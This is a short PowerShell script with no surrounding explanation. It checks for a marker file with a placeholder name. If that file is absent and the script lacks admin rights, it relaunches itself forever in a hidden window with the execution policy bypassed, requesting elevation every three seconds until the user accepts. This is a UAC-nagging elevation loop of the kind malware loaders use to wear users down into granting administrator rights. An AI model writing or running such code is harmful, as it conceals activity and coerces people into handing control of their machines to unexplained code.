function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Path "C:\Users\Public\{FLAG}")) {
    if (-not (Is-Admin)) {
        $scriptPath = $MyInvocation.MyCommand.Path
        do {
           $process = Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs -PassThru
           $process.WaitForExit();
            if ($process.ExitCode -eq 0) {

                exit 0
            }
            else {
                Start-Sleep -Seconds 3
            }
        } while ($true)
    }
}